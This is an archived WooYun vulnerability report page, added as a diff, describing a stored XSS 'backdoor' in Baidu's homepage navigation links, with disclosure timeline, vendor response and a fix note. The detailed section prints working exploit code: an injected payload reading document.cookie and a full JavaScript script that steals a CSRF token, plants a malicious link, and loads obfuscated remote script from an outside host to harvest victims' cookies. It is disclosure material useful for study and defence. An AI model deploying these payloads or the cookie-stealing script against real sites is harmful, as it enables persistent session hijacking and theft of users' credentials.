@@ -1,0 +1,414 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度首页Xss后门-可对用户进行持久劫持  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度首页Xss后门-可对用户进行持久劫持  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-07-16 18:12</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-16：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-07-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-08-06：	细节向普通白帽子公开<br/>
+									2012-08-16：	细节向实习白帽子公开<br/>
+									2012-08-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">百度首页某处代码存在缺陷，导致Xss，结合www.baidu.com域下的其它Xss，可以在百度首页 实现Xss后门，从而对用户进行长久的劫持。危害很明显：受害者每次打开百度首页都会触发Xss，从而将登录信息发送给俺～～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 一直想对百度首页的这个导航功能下手，前面测试过几次，都无果。<br />
+<br />
+<br />
+<br />
+2. 今天又手痒了，就去试了试。 首先添加一个网址。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1618021941cd39b6245adbe5b93a554859faaba5.jpg" target="_blank"><img src="../images/1618021941cd39b6245adbe5b93a554859faaba5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 抓包，可以看到，url和name应该是可控内容。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161803013bd86e19fa6231afb1e4fc2cfeb26b6e.jpg" target="_blank"><img src="../images/161803013bd86e19fa6231afb1e4fc2cfeb26b6e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 首先往url里添加了 &quot;, &gt; 等字符进行测试，返回错误，这说明百度在这里过滤了这些可能导致危险的特殊字符。<br />
+<br />
+<br />
+<br />
+5. 然后我又测试了一下&amp;quot;&amp;gt;，发现可以添加。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161803524dbb649bcc4c3d0280541ec6dc138aa3.jpg" target="_blank"><img src="../images/161803524dbb649bcc4c3d0280541ec6dc138aa3.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 但是服务器端并没有对&amp;quot;&amp;gt;做什么特殊处理，该怎么输出，还是怎么输出，这样我们就没办法利用这点了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161804161cb7970abada42c96a0c17203c01aae3.jpg" target="_blank"><img src="../images/161804161cb7970abada42c96a0c17203c01aae3.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 到这里，我就放弃了，打算清理战场走人，但是意外发生了。<br />
+<br />
+<br />
+<br />
+什么意外呢？我发现，这里的2个按钮都点不了了。。如图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161804273e91aef7f52ec6ec90d89874378e1efb.jpg" target="_blank"><img src="../images/161804273e91aef7f52ec6ec90d89874378e1efb.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 直觉告诉我，我加入的&amp;quot;&amp;gt;一定导致了代码的某处出现问题了，从而导致按钮失效。<br />
+<br />
+<br />
+<br />
+9. 于是开启浏览器的调试功能，刷新首页，弹出了错误提示！<br />
+<br />
+<br />
+<br />
+可以看到是下面这句发生了问题。<br />
+<br />
+<br />
+<br />
+</p><pre><code>baidu.json.parse=function(a){return(new Function(&quot;return (&quot;+a+&quot;)&quot;))()};</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16180440766d89d5784df6eef49942cbbf8d80b9.jpg" target="_blank"><img src="../images/16180440766d89d5784df6eef49942cbbf8d80b9.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 进一步查看局部变量a的内容，可以发现 a 就是我们添加的链接数据。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16180448cd1a40ae5964c56437f9d0eb1b788b99.jpg" target="_blank"><img src="../images/16180448cd1a40ae5964c56437f9d0eb1b788b99.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+定位到我们刚刚添加的那个链接处，发现了亮点， &amp;quot; 竟然变成了 \&quot; <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16180501ff194dd6e5bb03f5973cb801742f2ed8.jpg" target="_blank"><img src="../images/16180501ff194dd6e5bb03f5973cb801742f2ed8.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+11. 顿时明了了。 我们可以推测出百度开发人员大致的代码逻辑。<br />
+<br />
+<br />
+<br />
+</p><pre><code>A. 直接将导航数据[content]输出到首页里，用&lt;textarea&gt;&lt;/textarea&gt;当容器<br />
+B. 取出&lt;textarea&gt;&lt;/textarea&gt;里的value，需要注意的是，xx.value的方式取出 [content]时，内容里的&amp;quot;&amp;gt;&amp;lt;等会被自动转变为 &quot;&gt;&lt;<br />
+C. 百度的开发人员应该是意识到了 B 中的这个问题，对 &gt;,&lt; 进行了转义，但是此处却忘了将 &quot; 转义为 &amp;quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+12. 基于10和11，我们知道了&amp;quot;会变为&quot;,因而不难构造出利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.baidu.com/home/nplus/submit/nav<br />
+<br />
+type	1<br />
+sort	10<br />
+url	http://qzone.qq.com/&amp;quot;,&amp;quot;wooyun&amp;quot;:(function(){alert(document.cookie)})(),&amp;quot;wooyun2&amp;quot;:&amp;quot;<br />
+name	QQ绌洪棿<br />
+page	-1<br />
+from	res<br />
+cmd	add<br />
+bsToken	8b4c136d28cc4b8ff****2827d4005c1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+13. 最后，步骤9中的a变量的内容，大概是以下形式。<br />
+<br />
+<br />
+<br />
+...&quot;url&quot;:&quot;http://qzone.qq.com/&quot;,&quot;wooyun&quot;:(function(){alert(document.cookie)})(),&quot;wooyun2&quot;:&quot;&quot;,...<br />
+<br />
+<br />
+<br />
+而后，被 eval(&quot;(&quot;+a+&quot;)&quot;)，从而执行我们的alert(document.cookie);<br />
+<br />
+<br />
+<br />
+----------------------------------------------<br />
+<br />
+<br />
+<br />
+14. 确定存在以上后门缺陷之后，我们进而找到www.baidu.com的某Flash Xss。<br />
+<br />
+<br />
+<br />
+利用我在这里提到的技巧：http://zone.wooyun.org/content/368<br />
+<br />
+<br />
+<br />
+构建以下利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://xsst.sinaapp.com/baidurookit.php<br />
+http://xsst.sinaapp.com/baidurookit.php.txt</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+15. 当受害者打开 http://xsst.sinaapp.com/baidurookit.php 时，会调用<br />
+<br />
+<br />
+<br />
+http://xsst.sinaapp.com/baidurookit.js<br />
+<br />
+<br />
+<br />
+</p><pre><code>//alert(&quot;load ok! domain:&quot;+document.domain);<br />
+//start<br />
+getBsToken();<br />
+//first obtain bsToken<br />
+function getBsToken(){<br />
+	var _p=ajaxFunction();<br />
+	_p.open(&quot;GET&quot;,&quot;http://www.baidu.com/&quot;,true);<br />
+	_p.onreadystatechange=function(){<br />
+		if (_p.readyState==4 &amp;&amp; _p.status==200)<br />
+		{<br />
+			var content=_p.responseText;<br />
+			var bs=(content.match(/name=bsToken\s+value=&quot;([^&quot;]+)&quot;/)||[&quot;&quot;,&quot;&quot;])[1];<br />
+<br />
+			if(bs){<br />
+				addLink(bs);<br />
+			}<br />
+		}<br />
+	};<br />
+	_p.send(null);<br />
+}<br />
+//then post data to add an evil link<br />
+function addLink(bsToken){<br />
+	var _p=ajaxFunction();<br />
+	_p.open(&quot;POST&quot;,&quot;http://www.baidu.com/home/nplus/submit/nav&quot;,true);<br />
+	_p.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);<br />
+	_p.onreadystatechange=function(){<br />
+		if (_p.readyState==4 &amp;&amp; _p.status==200)<br />
+		{<br />
+			var content=_p.responseText;<br />
+			if(content){<br />
+				var obj=eval(&quot;(&quot;+content+&quot;)&quot;);<br />
+				if(obj.errNo===0){<br />
+					alert(&quot;ok~~ evil thing has been done&quot;);<br />
+				}<br />
+			}<br />
+		}<br />
+	};<br />
+	_p.send(&quot;type=1&amp;sort=10&amp;url=http:%2F%2Fqzone.qq.com%2F%26quot;,%26quot;wooyun%26quot;:(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,101,114,46,109,101,47,119,65,71,112,107,67);document.body.appendChild(window.s)})(),%26quot;wooyun2%26quot;:%26quot;&amp;name=%E7%99%BE%E5%BA%A6%E8%B4%B4%E5%90%A7.....&amp;page=-1&amp;from=res&amp;cmd=add&amp;bsToken=&quot;+bsToken);<br />
+}<br />
+//ajax function<br />
+//from http://www.w3school.com.cn/ajax/ajax_browsers.asp<br />
+function ajaxFunction(){<br />
+	var xmlHttp;<br />
+	try{<br />
+		// Firefox, Opera 8.0+, Safari<br />
+		xmlHttp=new XMLHttpRequest();<br />
+    }catch (e){<br />
+		// Internet Explorer<br />
+		try{<br />
+			xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);<br />
+		}catch (e){<br />
+			try{<br />
+				xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+			}<br />
+			catch (e){<br />
+				//alert(&quot;您的浏览器不支持AJAX！&quot;);<br />
+				return false;<br />
+			}<br />
+		}<br />
+    }<br />
+	return xmlHttp;<br />
+ }<br />
+//</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+16. 以上代码，会自动给受害者在百度首页加上一个含有恶意代码的连接。从而调用我们自己的JS代码，获取受害者信息。<br />
+<br />
+<br />
+<br />
+效果见漏洞证明！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试环境Win7, IE7,IE9,Chrome<br />
+<br />
+<br />
+<br />
+用户打开的第三方页面！触发flash xss，从而给受害者植入后门！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16180524fdf2ee0eba15d98a800acd91ecec0548.jpg" target="_blank"><img src="../images/16180524fdf2ee0eba15d98a800acd91ecec0548.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+用户每次打开百度首页，都会触发xss后门！<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/16180536eb7b551a513f6d2382bbfb85e9b43469.jpg" target="_blank"><img src="../images/16180536eb7b551a513f6d2382bbfb85e9b43469.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+得到的受害者cookies<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/161807514eb06f9f6e854457f67e0557c43c572b.jpg" target="_blank"><img src="../images/161807514eb06f9f6e854457f67e0557c43c572b.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">在读取 textarea的value之后，对&quot;也进行转义！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09732" title="百度首页Xss后门-可对用户进行持久劫持">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：16 </p>
+													<p class="detail">确认时间：2012-07-17 11:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">xss与csrf的结合，原本添加链接处的csrf已经修复过，但以此来看修复并不完全，而对于XSS的过滤也并不全面，感谢gainover的提交，我们会尽快修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-07-17：更正下是XSS 与 flash xss的结合  少看了段代码 感谢gainover</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9732";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
